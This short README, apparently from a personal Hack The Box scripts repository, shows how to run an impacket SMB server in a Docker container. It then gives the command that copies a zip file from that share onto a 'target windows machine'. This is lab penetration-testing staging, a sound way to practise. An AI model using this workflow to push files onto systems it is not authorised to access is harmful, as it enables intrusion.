Build the container

```
sudo docker build . -f Containerfile -t impacket:latest
```
Then copy the files you need to the host at for example location `/tmp/smbshare`

Then run it to start the smbserver
```
sudo docker run -v ~/repositories/my-htb-scripts/my_tools/smbserver/to_share:/tmp/smbshare -p 445:445 impacket:latest
```

Then on the target windows machine run 
```
copy \\10.10.15.217\myshare\upload_win.zip
```
